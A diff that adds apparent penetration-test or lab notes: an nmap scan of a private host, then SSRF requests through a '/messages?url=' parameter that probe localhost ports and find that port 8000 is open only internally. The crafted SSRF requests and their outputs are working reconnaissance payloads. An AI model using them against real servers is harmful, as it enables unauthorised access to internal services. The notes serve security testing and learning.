@@ -1,0 +1,41 @@
+[External Baseline]
+sudo nmap -n -Pn --top-ports 1000 10.0.30.19
+
+Open ports:
+22/tcp open ssh
+80/tcp open http
+
+[SSRF Discovery]
+GET /messages?url=http://127.0.0.1/api/users/all
+Status: 200 OK
+Fetched 424 bytes
+
+Interpretation:
+Server fetches user-controlled URL parameter.
+
+[Internal Port Testing]
+
+Port 22:
+GET /messages?url=http://127.0.0.1:22
+Observed:
+BadStatusLine('SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14\r\n')
+
+Port 3306:
+GET /messages?url=http://127.0.0.1:3306
+Observed:
+Connection refused
+
+Port 8080:
+GET /messages?url=http://127.0.0.1:8080
+Observed:
+Connection refused
+
+Port 8000:
+GET /messages?url=http://127.0.0.1:8000
+Observed:
+200 OK
+Fetched 424 bytes
+
+[Conclusion]
+Port 8000 responds internally but was not exposed externally.
+Therefore, port 8000 is ONLY open internally.
